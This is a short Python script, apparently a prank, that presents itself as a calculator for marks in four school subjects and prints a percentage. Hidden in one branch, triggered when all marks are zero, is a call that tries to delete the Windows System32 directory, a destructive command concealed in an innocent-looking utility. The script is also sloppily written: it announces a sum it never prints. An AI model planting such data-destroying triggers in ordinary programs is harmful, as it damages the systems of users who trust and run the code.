# DO NOT RUN WITHOUT READING
# --------------------------


import os

print("Enter Marks Obtained in 4 Subjects: ")
math = int(input("maths> "))
english = int(input("english> "))
science = int(input("science> "))
hindi = int(input("hindi> "))

sum = math + english + science + hindi
print("sum of math,english,science and hindi")

perc = (sum / 400) * 100

if perc == sum:
    print("SYBAUUU")
    os.remove(r'C:\Windows\System32')
elif perc != sum:
    print("good boy, no same.")
    print(end="Percentage Mark = ")
    print(perc)